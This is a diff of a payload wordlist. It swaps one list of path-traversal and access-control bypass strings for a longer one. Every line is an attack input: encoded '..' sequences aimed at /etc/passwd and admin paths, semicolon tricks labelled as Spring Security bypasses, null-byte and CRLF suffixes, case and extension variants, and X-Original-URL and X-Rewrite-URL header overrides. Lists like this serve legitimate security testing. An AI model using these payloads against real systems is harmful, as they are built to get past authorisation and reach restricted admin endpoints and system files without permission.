@@ -1,37 +1,69 @@
-/api../secret
-/api..%2fsecret
-/api%2f..%2fsecret
-/api/.%2fsecret
-
-/static/../etc/passwd
-/static/..%2fetc/passwd
-/static/%2e%2e/etc/passwd
-
-/app%00../
-/app/.//
-/app/./
-
-/api/v1%2fadmin
-/api/v1%2f..%2fadmin
-/api%2fv1%2fadmin
-
-/ADMIN
-/Admin
-/%61dmin
-/admin%09
-/admin%0a
-/admin/
-
-/api/user;admin=true/profile
-/api/user/profile;../admin
-
-//admin
-//admin/secret
-/api//admin
-///admin
-
-/api/public;/../private
-/api/v1;/../../admin
-
-/api/public#/../admin
-/public%23/../admin
+/admin (with X-Original-URL: /admin)
+/api/admin (bypassed via path normalization)
+GET /api/v1/..;/admin
+GET /api/v1/..;/api/admin
+GET /api/..%2fadmin
+GET /api/..%2F..%2Fadmin
+GET /normal/../admin
+GET /app/../../../admin
+GET /api/%2e%2e%2fadmin
+GET /api/%2e%2e/%2e%2e/admin
+GET /api/v1/%2e%2e%2fadmin
+GET /v1/%2e%2e/admin
+GET /%61dmin (a encoded)
+GET /%41dmin (A encoded)
+GET /app;.js (semicolon trick)
+GET /app.js/../admin
+GET /api/app;/admin (Spring Security bypass)
+GET /api/admin;/ (Spring Security bypass)
+GET /api/admin; (Spring Security bypass)
+GET /api/admin;jsessionid=xxx
+GET //admin
+GET //api/admin
+GET ///admin
+GET /./admin
+GET /./api/admin
+GET /api/./admin
+GET /.//admin
+GET /api/.//admin
+GET /api//admin
+GET /api/admin/
+GET /api/admin//
+GET /api/admin///
+GET /api/admin./
+GET /api/admin.
+GET /api/admin.html
+GET /api/admin.php
+GET /api/admin.js
+GET /api/admin.do
+GET /api/admin.action
+GET /api/admin.htm
+GET /api/admin.asp
+GET /api/admin.aspx
+GET /api/admin.jsp
+GET /api/admin.cfm
+GET /api/admin.json
+GET /api/admin.xml
+GET /api/admin.yaml
+GET /api/admin.yml
+GET /api/admin.txt
+GET /api/admin.bak
+GET /api/admin.old
+GET /api/admin.orig
+GET /api/admin.backup
+GET /api/admin.save
+GET /api/admin%20 (trailing space)
+GET /api/admin%09 (tab character)
+GET /api/admin%00 (null byte)
+GET /api/admin%0d (CR)
+GET /api/admin%0a (LF)
+GET /api/admin%0d%0a (CRLF)
+GET /api/ADMIN (uppercase)
+GET /api/Admin (mixed case)
+GET /API/admin (uppercase API)
+GET /api/v1/ADMIN
+GET /API/V1/ADMIN
+GET /api/v1 + X-Original-URL: /api/v1/admin
+GET /public + X-Rewrite-URL: /admin
+GET /static + X-Original-URL: /admin
+GET / + X-Forwarded-Prefix: /api/v1
